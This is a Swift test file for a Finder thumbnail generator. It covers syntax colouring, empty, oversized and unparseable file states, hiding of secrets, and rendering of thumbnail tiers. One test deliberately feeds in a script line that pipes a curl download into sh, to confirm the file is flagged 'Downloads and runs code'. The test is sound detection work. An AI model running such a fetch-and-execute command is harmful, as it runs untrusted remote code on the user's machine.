import CoreGraphics
import Foundation
import Testing
import VitrineSupport
@testable import VitrineThumbnail

/// Finder thumbnails (S-18, thumbnails r3-a): the lexer's colours, the page's states and marks, and the drawing's
/// tiers. Every sample is invented. roadmap: S-18
@Suite struct CodeLexerTests {
    func tokens(_ language: String, _ lines: [String]) -> [[CodeLexer.Run]] {
        var lexer = CodeLexer(language: language)
        return lexer.lex(lines)
    }

    @Test func swiftLineTakesTheCodeViewsTokens() {
        let runs = tokens("swift", [#"    let store: NoteStore = load("notes") // 8"#])[0]
        #expect(runs.contains(.init("let", .keyword)))
        #expect(runs.contains(.init("NoteStore", .type)))
        #expect(runs.contains(.init("load", .function)))
        #expect(runs.contains(.init(#""notes""#, .string)))
        #expect(runs.last == .init("// 8", .comment))
    }

    @Test func aBlockCommentCarriesOverLines() {
        let lines = tokens("c", ["int a; /* starts", "still a comment", "ends */ int b;"])
        #expect(lines[1] == [.init("still a comment", .comment)])
        #expect(lines[2].first == .init("ends */", .comment))
        #expect(lines[2].contains(.init("int", .keyword)))
    }

    @Test func configKeysAndJSONKeys() {
        #expect(tokens("yaml", ["  interval: 300"])[0].first == .init("  interval", .key))
        #expect(tokens("dotenv", ["export API_URL=https://example.com"])[0].first == .init("export API_URL", .key))
        let json = tokens("jsonl", [#"{"type":"user","n":3,"ok":true}"#])[0]
        #expect(json.contains(.init(#""type""#, .key)))
        #expect(json.contains(.init(#""user""#, .string)))
        #expect(json.contains(.init("3", .number)))
        #expect(json.contains(.init("true", .constant)))
    }

    @Test func markupTagsAttributesAndValues() {
        let runs = tokens("xml", [#"<sync enabled="true">on</sync>"#])[0]
        #expect(runs.first == .init("<sync", .tag))
        #expect(runs.contains(.init("enabled", .attribute)))
        #expect(runs.contains(.init(#""true""#, .string)))
        #expect(runs.contains(.init("on", .plain)))
    }
}

@Suite struct ThumbnailPageTests {
    /// The page for an invented file written to a temporary folder (the kind detector reads the file itself).
    func page(_ text: String, _ name: String, size: Int64? = nil) -> ThumbnailPage {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("thumb-\(UUID().uuidString)").appendingPathComponent(name)
        try? FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try? Data(text.utf8).write(to: url)
        defer { try? FileManager.default.removeItem(at: url.deletingLastPathComponent()) }
        let data = Data(text.utf8)
        return ThumbnailPage.make(data: data, fileName: name, fileSize: size ?? Int64(data.count), kind: ThumbnailPage.textKind(url))
    }

    @Test func emptyAndHugeStates() {
        #expect(page("  \n", "empty.swift").isEmpty)
        let big = page("2026-10-01 INFO ok\n", "events.log", size: 40 << 20)
        #expect(big.isHuge && !big.isEmpty)
    }

    @Test func aScriptThatDownloadsAndRunsCodeIsRed() {
        let p = page("#!/bin/sh\ncurl -fsSL https://invented.example.net/a.sh | sh\n", "install.sh")
        guard case .danger(let reason) = p.mark else { Issue.record("no danger mark: \(p.mark)"); return }
        #expect(reason == "Downloads and runs code")
        #expect(page("#!/bin/sh\necho hello\n", "hello.sh").mark == .none)
    }

    @Test func brokenFilesAreOrangeWithTheirLine() {
        #expect(page("<a>\n  <b>\n</a>\n", "broken.xml").mark == .caution("Does not parse at line 3"))
        #expect(page("{\"a\":1}\n{\"b\":\n", "q.jsonl").mark == .caution("Does not parse at line 2"))
        #expect(page("<a><b/></a>\n", "fine.xml").mark == .none)
    }

    @Test func secretsNeverReachThePicture() {
        let p = page("API_KEY=sk_live_51Hinvented00000000000000000000000000\nDEBUG=false\n", "app.env")
        guard case .text(let lines, _, _) = p.layout else { Issue.record("not text"); return }
        let drawn = lines.flatMap { $0.map(\.text) }.joined()
        #expect(!drawn.contains("sk_live_51Hinvented"))
        #expect(drawn.contains("DEBUG"))
    }

    @Test func tablesSplitTheirCellsAndBinaryPlistsReadAsXML() throws {
        guard case .table(let rows) = page("id\tname\nA-1\tHarbor\n", "orders.tsv").layout else { Issue.record("not a table"); return }
        #expect(rows.first == ["id", "name"])
        let bplist = try PropertyListSerialization.data(fromPropertyList: ["theme": "follow-system"], format: .binary, options: 0)
        let p = ThumbnailPage.make(data: bplist, fileName: "acme.plist", fileSize: Int64(bplist.count), kind: .code(language: "plist"))
        guard case .text(let lines, _, _) = p.layout else { Issue.record("not text"); return }
        #expect(lines.flatMap { $0.map(\.text) }.joined().contains("follow-system"))
    }

    @Test func aFileItCannotReadStillGetsACalmSheet() {
        let p = ThumbnailPage.placeholder(for: URL(fileURLWithPath: "/nonexistent/Gone.swift"))
        #expect(p.mark == .none && !p.isEmpty && p.badge == "SWIFT")
        #expect(p.layout == .text(lines: [], numbered: false, prose: false))
    }

    @Test func styleByKind() {
        #expect(page("let a = 1\n", "a.swift").glyph == "chevron.left.forwardslash.chevron.right")
        #expect(page("a: 1\n", "a.yaml").tint == "syn-const")
        #expect(page("a: 1\n", "a.yaml").badge == "YAML")
        // A marimo notebook (A-8) keeps the Python file's thumbnail: Python's lexer, the code glyph.
        let marimo = ThumbnailPage.Style.of(.code(language: "marimo"))
        #expect(marimo.language == "python")
        #expect(marimo.glyph == ThumbnailPage.Style.of(.code(language: "python")).glyph)
    }
}

@Suite struct ThumbnailRendererTests {
    @Test func tiersFollowTheDesignsCutOffs() {
        #expect(ThumbnailRenderer.tier(for: 16) == .glyph)
        #expect(ThumbnailRenderer.tier(for: 32) == .glyph)
        #expect(ThumbnailRenderer.tier(for: 33) == .silhouette)
        #expect(ThumbnailRenderer.tier(for: 127) == .silhouette)
        #expect(ThumbnailRenderer.tier(for: 128) == .content)
    }

    func pixel(_ image: CGImage, x: Int, y: Int) -> (r: UInt8, g: UInt8, b: UInt8, a: UInt8) {
        let ctx = CGContext(data: nil, width: image.width, height: image.height, bitsPerComponent: 8, bytesPerRow: image.width * 4,
                            space: CGColorSpace(name: CGColorSpace.sRGB)!, bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
        ctx.draw(image, in: CGRect(x: 0, y: 0, width: image.width, height: image.height))
        // A bitmap context's first row is the top of the image: `y` counts down from the top.
        let p = ctx.data!.assumingMemoryBound(to: UInt8.self), i = (y * image.width + x) * 4
        return (p[i], p[i + 1], p[i + 2], p[i + 3])
    }

    @Test func everySizeDrawsAPaperSheetAndOnlyDangerDrawsRed() throws {
        let calm = ThumbnailPage(layout: .text(lines: [[.init("let a = 1", .plain)]], numbered: true, prose: false),
                                 glyph: "chevron.left.forwardslash.chevron.right", tint: "syn-kw", badge: "SWIFT")
        var danger = calm; danger.mark = .danger("Downloads and runs code")
        for side in [16, 32, 64, 128, 256, 512] as [CGFloat] {
            let image = try #require(ThumbnailRenderer.image(calm, side: side, scale: 1))
            #expect(image.width == Int(side))
            let corner = pixel(image, x: 0, y: 0)
            #expect(corner.a == 0, "transparent around the sheet at \(side) pt")
            let sheet = ThumbnailRenderer.sheet(in: CGSize(width: side, height: side))
            // The mark sits on the sheet's lower-left corner: probe the disc above its centre, between the arms of its ✕,
            // and the bare paper there on a calm page. Bottom-up points → top-down pixel rows.
            let d = ThumbnailRenderer.markDiameter(side)
            let centre = CGPoint(x: sheet.minX - d * 0.12 + d / 2, y: sheet.minY - d * 0.12 + d / 2)
            let probe = (x: Int(centre.x), y: Int(side - (centre.y + d * 0.36)))
            let paper = pixel(image, x: probe.x, y: probe.y)
            #expect(!(paper.r > 200 && paper.g < 120 && paper.b < 120), "no red on a calm page at \(side) pt: \(paper)")
            if side > 16 { #expect(paper.r > 230 && paper.g > 230 && paper.b > 230, "paper at \(side) pt: \(paper)") }
            let marked = pixel(try #require(ThumbnailRenderer.image(danger, side: side, scale: 1)), x: probe.x, y: probe.y)
            #expect(marked.r > 200 && marked.g < 120 && marked.b < 120, "red mark at \(side) pt: \(marked)")
        }
    }

    @Test func theSwitchIsOnUntilTurnedOff() {
        #expect(ThumbnailSettings.key == "thumbnails.enabled")
    }
}
